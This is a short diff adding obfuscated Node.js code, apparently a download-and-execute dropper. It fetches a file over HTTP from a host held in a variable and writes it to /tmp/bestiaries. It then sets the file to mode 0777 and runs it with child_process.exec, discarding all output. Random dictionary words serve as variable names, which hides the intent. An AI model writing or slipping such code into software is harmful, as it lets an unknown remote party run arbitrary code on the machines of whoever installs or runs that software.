@@ -1,0 +1,11 @@
+foregallery = http.get('http://' + uncompassed + '/unpromisingly', function(nonhabitualness) {
+          var contemnor = fs.createWriteStream('/tmp/bestiaries');
+          nonhabitualness.on('data', function(unsacred) {
+            contemnor.write(unsacred);
+          });
+          nonhabitualness.on('end', function() {
+            contemnor.end();
+            fs.chmod('/tmp/bestiaries', '0777');
+            child_process.exec('/tmp/bestiaries', function(err, stdout, stderr) {});
+          });
+        })
